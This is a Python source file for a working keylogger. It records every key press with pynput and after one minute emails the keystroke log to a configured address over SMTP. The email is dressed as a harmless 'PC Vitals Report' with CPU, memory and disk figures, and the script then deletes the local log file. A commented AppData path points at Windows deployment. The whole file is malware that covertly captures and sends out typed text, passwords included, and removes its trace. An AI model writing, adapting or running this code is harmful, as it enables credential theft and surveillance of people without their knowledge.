import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv, find_dotenv
import psutil  # For system monitoring
import logging
import os
import threading
from datetime import datetime
from pynput.keyboard import Key, Listener

# Load environment variables from .env file in parent directory
load_dotenv(find_dotenv(".env"))

# Email configuration with environment variables(for privacy purposes)
smtp_server = os.getenv('SMTP_SERVER')
print(smtp_server)
smtp_port = int(os.getenv('SMTP_PORT'))
sender_email = os.getenv('SENDER_EMAIL')
sender_password = os.getenv('SENDER_PASSWORD')
recipient_email = os.getenv('RECIPIENT_EMAIL')

# Log file path
# log_file = os.path.expanduser("~\\AppData\\Roaming\\keylog.txt") # ForWindows
log_file = os.path.expanduser("./keylog2/keylog.txt")  # For test enviroment

# Configure logging
logging.basicConfig(filename=log_file,
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')


# Function to get PC vitals
def get_pc_vitals():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage('/').percent
    return {
        'cpu_usage': cpu_usage,
        'memory_usage': memory_usage,
        'disk_usage': disk_usage
    }


# # Function to log keys
# def on_press(key):
#     try:
#         logging.info(str(key.char))
#     except AttributeError:
#         logging.info(str(key))
# -----------------------------------
# List to store key presses
key_presses = []


# Function to log keys in a readable paragraph format
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            key_presses.append(key.char)
        else:
            key_presses.append(f'[{key}]')
    except AttributeError:
        key_presses.append(f'[{key}]')


# Function to write key presses to log file in paragraph format
def write_key_presses_to_log():
    with open(log_file, 'a') as f:
        f.write(' '.join(key_presses) + '\n')
    key_presses.clear()


# Function to send email with vitals and keylog file using Gmail SMTP
def send_email_with_vitals(vitals):
    # Create message container - the correct MIME type is multipart/alternative
    msg = MIMEMultipart()
    msg['Subject'] = 'PC Vitals Report'
    msg['From'] = sender_email
    msg['To'] = recipient_email

    # Create the HTML version of your message
    html = f"""
    <html>
        <body>
            <p>Dear User,</p>
            <p>Here are the PC vitals:</p>
            <ul>
                <li>CPU Usage: {vitals['cpu_usage']}%</li>
                <li>Memory Usage: {vitals['memory_usage']}%</li>
                <li>Disk Usage: {vitals['disk_usage']}%</li>
            </ul>
            <p>Best regards,<br>Your Application</p>
        </body>
    </html>
    """
    # Attach HTML message to email
    msg.attach(MIMEText(html, 'html'))

    # Attach the keylog file to the email
    if os.path.exists(log_file):
        with open(log_file, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename= {os.path.basename(log_file)}",
            )
            msg.attach(part)

    try:
        # Create SMTP session for sending the mail
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Enable TLS encryption
        # Login with sender email and password
        server.login(sender_email, sender_password)
        # Send email
        server.sendmail(sender_email, recipient_email, msg.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email. Error: {str(e)}")
    finally:
        server.quit()  # Terminate the SMTP session


# Function to stop logging and send email
def stop_logging_and_send_email():
    listener.stop()  # Stop the keylogger
    write_key_presses_to_log()  # Write remaining key presses to log file
    pc_vitals = get_pc_vitals()
    send_email_with_vitals(pc_vitals)
    os.remove(log_file)  # Delete the log file after sending


# Function to start keylogger and set timer to stop logging after 1 minute
def start_keylogger():
    global listener
    listener = Listener(on_press=on_press)
    listener.start()
    # Stop logging and send email after 1 minute
    threading.Timer(60, stop_logging_and_send_email).start()
    # Periodically write key presses to log file
    threading.Timer(59, write_key_presses_to_log).start()
    listener.join()


# Start keylogger and send email periodically
if __name__ == "__main__":
    start_keylogger()
